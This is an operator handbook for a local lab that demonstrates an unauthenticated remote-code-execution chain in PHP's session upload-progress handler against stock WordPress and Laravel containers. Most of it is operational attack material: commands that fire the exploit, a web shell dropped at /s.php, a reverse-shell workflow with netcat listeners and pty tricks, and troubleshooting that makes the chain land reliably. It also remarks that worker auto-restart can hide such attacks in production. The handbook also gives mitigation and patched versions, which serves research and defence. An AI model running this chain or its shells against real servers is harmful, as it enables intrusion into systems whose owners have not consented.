# php2shell — Operator Handbook

Everything built for the CVE-2026-109618 / CVE-2026-109619 demonstration:
what each target is, how to start it, how to run the chain, and what will bite
you.

**This document is for reading. Nothing here needs to be executed to follow along.**

> Authorized lab use only. Every target below is a container on your own
> Mac bound to `127.0.0.1`. The payloads are designed to fail safely against
> anything else.

---

## 1. What this is

CVE-2026-109618 / `-109619` are two bugs in PHP's `session.upload_progress`
handler (`php_session_rfc1867_callback`). The handler runs inside
`php_hash_environment`, **before** `zend_activate_modules` and therefore
**before** your application's code executes.

That single fact drives every consequence in this lab:

- The target page does **not** need an upload form.
- The target app does **not** need to be vulnerable.
- Any PHP page that returns a response is enough.
- A framework (Laravel, WordPress) is never involved in the exploit path.

The core chain is **9bie's ASLR-bypass exploit**, which turns the bug
into real code execution by leaking the heap base and `libphp` base over
HTTP, then forging a `HashTable` with `pDestructor = zif_system`. It is
vendored here as `php-session-uaf/` and substantially extended locally:
container/URL auto-resolution, automatic reverse-shell trigger staging, a
built-in interactive listener, and proof-file fallback. The upstream origin
is kept in `php-session-uaf/README.md` — credit stays with 9bie for the
original chain; the automation layer is this lab's.

---

## 2. The two targets

| Target | Container | URL | PHP | Purpose |
|---|---|---|---|---|
| ACME Engineering Blog | `acme-wordpress` | http://127.0.0.1:8091 | 8.4.26 | **Stock WordPress.** Main demo target. |
| Laravel | `acme-laravel` | http://127.0.0.1:8090 | 8.4.26 | Framework target. Proves framework-agnosticism. |

Both run Apache prefork with **exactly one worker** — required, see §6.

**WordPress credentials:** `admin` / `Adm1n!Lab2026` (admin panel only; the
exploit never touches it).

WordPress also runs a `mariadb:11` container named `wp-db`. It is internal
only and not exposed to your Mac.

---

## 3. Directory layout

```
~/php2shell-lab/
├── php-session-uaf/     ← THE EXPLOIT
│   ├── sessionshell.py            ← entry point (forked + extended)
│   └── out/offsets.env            ← zif_system / ZVAL_PTR_DTOR offsets
│
├── wordpress/                     ← STOCK WORDPRESS target (main demo)
│   ├── demo.sh / stage.sh / reset.sh
│   ├── docker-compose.yml
│   ├── Dockerfile                 ← PHP 8.4.26 + stock WP core
│   ├── apache.conf                ← single worker (critical)
│   ├── php.ini                    ← 8M limit (critical)
│   ├── supervise.sh               ← auto-restart after a worker crash
│   └── assets/
│
├── laravel/                       ← Laravel 11 framework target
│   ├── docker-compose.yml
│   ├── Dockerfile
│   ├── apache.conf / vhost.conf
│   ├── php.ini                    ← 128M (see §6, Laravel caveat)
│   └── assets/
│
```

---

## 4. Starting and stopping

### Start everything

```bash
cd ~/php2shell-lab/wordpress  && docker compose up -d
cd ~/php2shell-lab/laravel    && docker compose up -d
```

Verify both respond:

```bash
for p in 8090 8091; do
  printf "%s -> %s\n" "$p" "$(curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:$p/)"
done
```

Expect `200`, `200`. WordPress can take ~30 s on first boot while it
seeds its core files and installs.

### Stop everything

```bash
cd ~/php2shell-lab/wordpress && docker compose down
cd ~/php2shell-lab/laravel   && docker compose down
```

### Check what is running

```bash
docker ps --format "{{.Names}}\t{{.Status}}\t{{.Ports}}" | grep -E "acme|wp-"
```

---

## 5. Running the demo

### WordPress (main target)

```bash
cd ~/php2shell-lab/wordpress
./demo.sh              # run the demo (stages its own payload every time)
./demo.sh --reset      # only when you want fresh containers / a clean slate
```

`./demo.sh` is **repeatable**: it re-stages `out/x` and clears the previous
proof at the start of every run, so you can run it back-to-back without
resetting anything. `--reset` additionally recreates the containers, which is
only needed if you want a pristine starting state.

Expected output:

```
[2] Ground truth: did code execution happen?
    /var/www/html/s.php exists — the payload was written by the
    compromised worker, not by us:
    /var/www/html/s.php  www-data:www-data  1234 bytes

[3] Interactive shell dropped at /s.php:
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then open <http://127.0.0.1:8091/s.php> in a browser for the interactive
shell (`cd /etc`, `ls`, `cat passwd`).

### Laravel

There is **no `demo.sh`** for Laravel. Drive it directly:

```bash
cd ~/php2shell-lab/php-session-uaf
python3 sessionshell.py -u http://127.0.0.1:8090/ \
    -c 'id>/tmp/lv' --proof-file ''
docker exec acme-laravel cat /tmp/lv
```

Expect `uid=33(www-data)`. No root chain here (see §6).

The OOM field is sized automatically from the target's `memory_limit`
(Laravel 128M -> 160 MB, WordPress 8M -> 12 MB). You only need
`--huge-mb` to force a specific value. Getting this wrong looks exactly
like a broken target; it is not.

### Reverse shell — one command, no listener to start

```bash
cd ~/php2shell-lab/php-session-uaf
python3 sessionshell.py -u http://127.0.0.1:8091/
```

That is the whole thing. With no `-c`, the exploit:

1. stages the reverse-shell trigger on the target's `/out` mount,
2. starts its own listener on `:4444` (no `nc` needed),
3. fires the chain,
4. drops you into an interactive `/bin/sh` in the same terminal.

```
[*] listening on 0.0.0.0:4444 -- waiting for callback
[+] shell connected from 203.0.113.10:53271

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cd /etc
$ pwd
/etc
```

`cd`, `ls`, `cat`, Ctrl-C and Ctrl-D all behave normally. `exit` closes the
session and the exploit returns.

Useful flags:

```bash
--shell-port 5555     # listen on a different port
--shell               # explicit form, same as omitting -c
```

**If you prefer your own listener**, the classic two-terminal flow still
works. Note the macOS syntax caveat below:

```bash
# Terminal 1
nc -lvn 4444

# Terminal 2
python3 sessionshell.py -u http://127.0.0.1:8091/ -c 'sh</out/r'
```

> **`nc -lvnp 4444` will not work on macOS.** That is the Linux / nmap-ncat
> form. Apple's `/usr/bin/nc` is the OpenBSD build, where `-p` means *source
> port* and the port is positional, so it exits with
> `nc: missing port with option -l`.
>
> | You have | Working command |
> |---|---|
> | macOS `/usr/bin/nc` (default) | `nc -lvn 4444` |
> | `ncat` (Homebrew, `brew install nmap`) | `ncat -lvnp 4444` |
>
> `./rev.sh` detects which one you have and prints the exact command.

**One-command helper** (stages the trigger, tells you what to run, starts the
listener on the correct syntax):

```bash
cd ~/php2shell-lab/wordpress
./rev.sh                 # listener on :4444
./rev.sh 5555            # custom port
```

The helper prints the fire command for **another** terminal — it blocks on the
listener, so it cannot fire the exploit itself.

Then in terminal 2:

```bash
cd ~/php2shell-lab/php-session-uaf
python3 sessionshell.py -u http://127.0.0.1:8091/ -c 'sh</out/r'
```

**The `FIRED` line is success, not failure.** `sh</out/r` writes nothing, so
there is nothing to read back; the exploit says so and exits `0`.

For a longer command, chain it through a staged trigger file (see §5).

**Why the LAN IP matters:** Docker Desktop does not route the bridge gateway
to the host, so the container must dial your Mac's LAN address. Get it with
`ipconfig getifaddr en0`. `Connection refused` from inside the container means
the path is fine and nothing is listening yet; `Name or service not known`
means the IP was empty or wrong.

**Why `script -qfc /bin/sh /dev/null`:** a bare `/bin/sh -i` has no TTY, so you
get no prompt and no job control. `assets/rev.php` allocates a pty to fix that.

---

## 6. Things that will bite you

These are the failure modes already hit and solved. Read this section before
debugging anything.

### 6.1 `EXPLOIT_FAILED` — root cause found, fixed at the source

**This was previously misdiagnosed in this handbook as "the tool lies."** It
does not lie. It was looking in the wrong place, and that has now been fixed
in `sessionshell.py`.

The real cause: the exploit command runs *inside the container*, so
`id>/out/p1` writes to the **container's** `/out`. The proof path defaulted to
the exploit repo's own `out/p1` — correct only when the exploit's bundled
compose stack is the target. Pointed at a lab container, that file never
appears, so a genuinely successful run reported failure.

`sessionshell.py` now resolves this automatically. The URL's port is matched to a
running container, that container's `/out` mount is located on the host, and
the proof is read from there:

```
[*] proof path resolved from container acme-wordpress: .../wordpress/out/p1
[+] W3 attempt 1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Exit status is now trustworthy:

| Situation | exit | output |
|---|---|---|
| Proof read | `0` | `PROOF: ...` |
| Proof path not writable in command | `1` | `EXPLOIT_FAILED` |
| `--proof-file ''` given | `1` | `EXPLOIT_FAILED` (expected — check disabled) |

Two flags still override the auto-detection:

```bash
--proof-file <path>   # read this exact file
--proof-file ''       # disable the check entirely
```

**Practical rule for demos:** still verify on the target itself, because that
is the strongest evidence, not because the tool is lying.

```bash
docker exec acme-wordpress ls -l /var/www/html/s.php
```

`demo.sh` does its own check because it verifies the payload file exists on
the target filesystem (no `/out` involvement, so no auto-resolution), which is
stronger evidence than trusting the tool's own report.

> Note: with `-c 'sh</out/x'` the command's write is a **read** redirect, not
> `>`, so there is nothing for auto-resolution to map. That case relies on
> `--proof-file` or an on-target check. `demo.sh` already handles it.

### 6.2 Single worker is mandatory

The chain leaks the heap base in one request, the `libphp` base in a second,
then fires in a third — **all assuming the same process handles all three.**
With Apache's default multi-worker config, each request lands on a different
child with a different address space, and the leak is worthless.

Symptom: `HEAP_LEAK_FAILED` immediately, on every attempt.

Both `wordpress/apache.conf` and `laravel/apache.conf` set:

```apache
StartServers           1
MaxRequestWorkers      1
ServerLimit            1
MaxConnectionsPerChild 0
```

**Known trap:** `laravel/apache.conf` existed from the start but was *not
mounted* in `docker-compose.yml`, which is why Laravel failed while the
identical config worked elsewhere. It has since been added. If Laravel ever
stops working, check that mount first.

Verify per container:

```bash
docker exec acme-wordpress grep MaxRequestWorkers /etc/apache2/conf-enabled/zz-lab.conf
```

### 6.3 The PHP version must be vulnerable

**The official `wordpress:php8.4-apache` image is already patched.** It ships
PHP 8.4.27, whose changelog reads:

```
PHP 8.4.27 (22 Oct 2026)
- Core:
  . Fixed GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (Avoid state corruption via
    bailout). (CVE-2026-109618, CVE-2026-109619)
```

The WordPress lab therefore **pins PHP 8.4.26** and copies WordPress core
unmodified from the official image. The app is stock; only the PHP build is
pinned.

Verify:

```bash
docker exec acme-wordpress php -r 'echo PHP_VERSION;'   # must say 8.4.26
```

Symptom if wrong: `HEAP_LEAK_FAILED` even though config is perfect — and it
would still fail on a plain `<?php echo "OK"; ?>` page in that container.

### 6.4 `memory_limit` is calibration, not a magic number

`8M` is what the exploit's OOM trigger was calibrated against, and what the
published offsets assume. It is **not** a hard requirement in the sense that
"PHP cannot run at 8M."

- WordPress runs comfortably at 8M (peaks around
  2–4 MB per request).
- **Laravel is borderline at 8M** — it intermittently OOMs inside Composer's
  autoloader and returns `500`:

  ```
  Allowed memory size of 8388608 bytes exhausted
  at vendor/composer/ClassLoader.php:576
  ```

  The Laravel lab therefore runs at **128M** and the exploit is given a
  correspondingly larger OOM body, which the script now detects itself. The calibration that
  matters is the address layout, not the literal `8M`.

If a target 500s before the exploit even starts, that is an app/memory
problem, not the exploit.

### 6.5 After exploitation, the worker dies and Apache restarts

That is expected. The chain achieves code execution by corrupting memory and
the worker faults afterwards. `supervise.sh` restarts Apache so the site stays
available between runs.

That restart behaviour is, incidentally, precisely why this kind of
exploitation can go unnoticed in production: the service comes back and the
crash is never attributed to an attack.

### 6.6 A stale proof file will fake a success

Ground-truth files persist between runs. If you check `/var/www/html/s.php`
without clearing it first, you may be looking at a **previous** run's artifact.

`./demo.sh` now deletes it at the start of every run, so this is handled for
you. If you are driving the exploit manually, clear it yourself:

```bash
docker exec acme-wordpress rm -f /var/www/html/s.php
```

**Also note:** the container clock is UTC while your Mac is UTC+3, so a file
timestamped `19:04` may well be from a run at `22:04` local. When in doubt,
use a unique filename per run.

### 6.7 Docker Desktop and the reverse shell

The container cannot reach your Mac on the Docker bridge gateway. It must
dial your **LAN IP**:

```bash
ipconfig getifaddr en0     # e.g. 203.0.113.10
```

`Connection refused` from inside the container is *good* news — it means the
path is open and nothing is listening yet. `Name or service not known` means
the IP was empty or wrong.

A plain `/bin/sh -i` will not give you an interactive prompt (no TTY). The lab
uses `script -qfc /bin/sh /dev/null` to allocate a pty.

---

## 7. What is actually the CVE, and what is not

The demo stops at code execution as the **web user**. That is the whole claim,
and it is the one the CVE supports on its own.

| Layer | What it is | Honest framing |
|---|---|---|
| `www-data` shell | **The CVE.** Unauthenticated RCE in PHP's multipart/session handling. | "This is the vulnerability." |

No privilege-escalation helper and no `sudo` rule are installed in either
target. A hardened host is not the interesting part of this story; the
pre-RINIT code execution is.

The claim is narrow and worth keeping narrow: *"The CVE gets me `www-data`.
Nothing about the app, no login, no upload form."*

---

## 8. Walkthrough

### Before you start

1. `cd ~/php2shell-lab/wordpress && ./demo.sh` — stages itself and clears the
   previous proof, so repeat runs need no reset. Use `--reset` only when you
   want fresh containers.
2. Confirm `200` on <http://127.0.0.1:8091/>
3. Have the shell page URL ready: <http://127.0.0.1:8091/s.php> (it 404s until
   the exploit drops it — that is correct)

### Suggested sequence

| Step | Action | Expected |
|---|---|---|
| 1 | Load the WordPress homepage | Stock WordPress, default theme, no plugins |
| 2 | Visit `/wp-login.php`, then back to the homepage | A normal blog; no upload form anywhere |
| 3 | Run `sessionshell.py` against the homepage | Chain fires; the app is never invoked |
| 4 | `docker exec ... ls -l /s.php` | The file exists — written by the compromised worker |
| 5 | Open `/s.php` and run `id`, `ls` | Code execution as `www-data` |
| 6 | Optional: reverse shell in a terminal | The target dials back to your listener |
| 7 | Apply the mitigation below and retry | Chain no longer lands |

### The claim worth stating plainly

> "The CVE gets me `www-data` on a stock install. No login, no upload form,
> no application involvement."

That distinction is the difference between a credible demonstration and an
overclaim, and it is the part most write-ups get wrong.

### Mitigation

```ini
session.upload_progress.enabled = Off
```

Plus: upgrade to **8.2.35 / 8.3.36 / 8.4.27 / 8.5.12** or later, whichever
branch you run. The 8.4.27 changelog names both CVEs explicitly.

---

## 9. Troubleshooting quick reference

| Symptom | Likely cause | Fix |
|---|---|---|
| `HEAP_LEAK_FAILED` immediately | Not single-worker, or patched PHP | Check `zz-lab.conf` mount; check `php -r 'echo PHP_VERSION;'` |
| `EXPLOIT_FAILED` but nothing on disk | Genuine miss, or proof path unresolved | Read the `proof path resolved from container` line; retry (built-in envelope) |
| `EXPLOIT_FAILED` **and** artifact on target | Proof path was wrong (pre-fix builds / explicit `--proof-file ''`) | Now auto-resolved; or pass `--proof-file <container /out host path>` |
| Site returns `500` before exploiting | App memory floor exceeded | Raise `memory_limit` (Laravel needs this) |
| Site down after a run | Worker died, restart in progress | Wait ~1 s for `supervise.sh` |
| Reverse shell never connects | Wrong IP, or nothing listening | Use `ipconfig getifaddr en0`; start listener first |
| Reverse shell connects, no prompt | No TTY | Use `script -qfc /bin/sh /dev/null` |
| Laravel `500` at 128M | Stale cache / DB ownership | Check `storage/`, `bootstrap/cache`, `database/*.sqlite` ownership |

---

## 10. One-paragraph summary for reuse

> CVE-2026-109618 / `-109619` are unauthenticated RCEs in PHP's
> `session.upload_progress` handler. The handler runs before the application
> boots, so any PHP page is a valid target — no upload form, no admin access,
> no vulnerable app code required. This lab demonstrates a full chain against
> stock WordPress on PHP 8.4.26 (RCE as `www-data`), with a Laravel target
> showing the bug is application- and framework-agnostic. Mitigation is
> `session.upload_progress.enabled = Off` plus upgrading to PHP 8.2.35 /
> 8.3.36 / 8.4.27 / 8.5.12 or later.
